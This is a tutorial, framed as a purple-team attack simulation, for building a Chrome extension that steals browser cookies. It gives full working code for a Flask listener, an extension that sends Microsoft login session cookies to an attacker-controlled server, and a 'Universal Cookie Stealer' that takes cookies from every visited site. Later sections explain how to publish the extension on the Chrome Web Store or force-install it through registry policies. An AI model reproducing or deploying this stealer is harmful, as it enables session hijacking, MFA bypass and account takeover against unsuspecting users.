# Attack Simulation - Chrome extension cookie stealer 

***

## Goals
As the browser is the new endpoint and malicious browser extensions may not be monitored in real time by companies due to the cost of these additional services, this is a good way to get cookie data from victims. For this I am using a Digital Ocean Ubuntu droplet to be the listener.

Malicious Chrome extensions can:
1. Use the chrome.cookies API to read cookies from specific domains.
2. Monitor tab activity to detect login events.
3. Exfiltrate cookies to a remote server via HTTP requests or form submissions.

The Cookie-Bite attack is a well-documented PoC that shows how session cookies from Microsoft services can be stolen and used to bypass MFA.

## Listener
To create the listener, on my Ubuntu droplet I will do pip3 install flask. I then create a python script called server.py with the following code:
```
from flask import Flask, request
app = Flask(__name__)

@app.route('/steal', methods=['POST'])
def steal():
    data = request.json
    print("Cookies received:", data)
    return "OK", 200

app.run(host='0.0.0.0', port=5000)
```
Be aware that this might not work due to CORS, so to fix that install pip3 install flask-cors. The new code is now this one:
```
from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # This allows all origins by default

@app.route('/steal', methods=['POST'])
def steal():
    data = request.json
    print("Cookies received:", data)
    return "OK", 200

app.run(host='0.0.0.0', port=5000)
```
This will automatically handle the OPTIONS preflight and add the necessary headers like:
1. Access-Control-Allow-Origin
2. Access-Control-Allow-Methods
3. Access-Control-Allow-Headers

This will look for whenever someone browses to https://login.microsoftonline.com and grab all cookies from that login session and display them onscreen. This can be modified in later files in this document.

## Necessary Chrome Extension Files
Let's now make our necessary chrome files. This will be for login.microsoftonline.com, but we will modify this later.

The extension will need a manifest.json file, specifically version 3. This file defines your extension’s permissions and behavior. For cookie access and tab monitoring, you’ll need:
```
{
  "name": "Cookie Stealer PoC",
  "version": "1.0",
  "manifest_version": 3,
  "permissions": [
    "cookies",
    "tabs",
    "scripting"
  ],
  "host_permissions": [
    "*://*.microsoftonline.com/*"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "action": {
    "default_title": "Cookie Stealer"
  }
}

```
Key Permissions Explained
1. "cookies": Grants access to read/write browser cookies.

2. "tabs": Lets you monitor tab activity and URLs.

3. "scripting": Required to inject or execute scripts.

4. "host_permissions": Specifies which domains the extension can access cookies from.


Next we need a background.js file. This script runs in the background and listens for tab updates. When a user visits a target domain (e.g., Microsoft login), it grabs cookies and sends them to your server.

```
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url.includes("login.microsoftonline.com")) {
    chrome.cookies.getAll({ domain: "login.microsoftonline.com" }, (cookies) => {
      fetch("http://your-droplet-ip:5000/steal", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(cookies)
      });
    });
  }
});

```

Make sure you replace (http://your-droplet-ip) with your Ubuntu IP.

What This Does
1. Waits for a tab to finish loading.
2. Checks if the URL matches the target domain.
3. Uses chrome.cookies.getAll() to extract cookies.
4. Sends them to your server using fetch().

## Testing
1. First, fire up server.py on Ubuntu.
2. Open Chrome and go to chrome://extensions/.
3. Enable Developer Mode.
4. Click Load unpacked and select your extension folder.
5. Once loaded, the extension will silently monitor tabs and send cookies when the target domain is visited.

We will use developer mode for the purple team as its too much headache to create a developer account and send this to the chrome store.

Additional note is my Digital Ocean does not have the firewall turned on, but if you do, you need to allow for port 5000 as thats what I am using in my Flask script.

As the Flask server creates a URL directory called /steal, you can test connectivity to it via curl http://your-droplet-ip:5000/steal. Your Flask app is just receiving the cookies via a POST request and printing them to the console or terminal.

If you want to store the cookies in a file inside a folder called steal, you can modify your Flask route like this:
```
import os
import json

@app.route('/steal', methods=['POST'])
def steal():
    data = request.json
    os.makedirs("steal", exist_ok=True)
    with open("steal/cookies.json", "w") as f:
        json.dump(data, f, indent=2)
    return "Saved", 200
```

This will:
1. Create a steal folder if it doesn’t exist.
2. Save the cookies to steal/cookies.json.


## Grab from any URL
To make your Chrome extension PoC grab cookies from any site the user visits (instead of just login.microsoftonline.com), you’ll need to update both the manifest.json and background.js files to broaden permissions and generalize the logic.

The update Manifest file would be:
```
{
  "name": "Universal Cookie Stealer",
  "version": "1.0",
  "manifest_version": 3,
  "permissions": [
    "cookies",
    "tabs",
    "scripting"
  ],
  "host_permissions": [
    "<all_urls>"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "action": {
    "default_title": "Cookie Stealer"
  }
}
```
The updated background.js file would be:
```
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url.startsWith("http")) {
    const url = new URL(tab.url);
    chrome.cookies.getAll({ domain: url.hostname }, (cookies) => {
      fetch("http://your-droplet-ip:5000/steal", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          site: url.hostname,
          cookies: cookies
        })
      });
    });
  }
});
```

What Changed?
1. tab.url.startsWith("http"): Ensures you’re only grabbing cookies from actual websites.
2. new URL(tab.url).hostname: Dynamically extracts the domain from any visited site.
3. chrome.cookies.getAll({ domain }): Pulls cookies for that domain.
4. Sends cookies to your server with the domain included for context.

Want to get even more cookies? You can use:
```
chrome.cookies.getAll({}, (cookies) => {
  // This grabs ALL cookies the browser has access to
});
```

But be cautious—this could include cookies from unrelated sessions or tabs.

## Publish
To make your Chrome extension PoC installable without requiring Developer Mode, you’ll need to publish it through the Chrome Web Store or use enterprise deployment. Here’s how each option works:

Option 1: Publish to the Chrome Web Store:
1. Create a developer account: Go to the Chrome Web Store Developer Dashboard and pay a one-time $5 registration fee.
2. Package your extension: Zip the folder containing your manifest.json, scripts, and assets.
3. Submit for review:
4. Upload the ZIP file.
5. Fill out metadata (name, description, screenshots).
6. Choose visibility: Public, Unlisted, or Private.
7. Wait for approval: Google will review your extension for policy compliance.
8. Share the link: Once approved, users can install it directly without enabling Developer Mode.

If your PoC is for internal testing, use the Unlisted option to keep it hidden from search results.

Option 2: Enterprise Deployment (Self-Hosting)

For Windows:
1. Use the Windows Registry to whitelist and force-install the extension.
2. You’ll need the extension’s ID and update URL.
3. Pack your extension using Chrome’s “Pack Extension” tool.
4. Host the .crx file and update.xml on a secure server.
5. Configure registry keys:
```
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallAllowlist]
"1"="your_extension_id"

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallSources]
"1"="https://yourdomain.com/*"
```
















































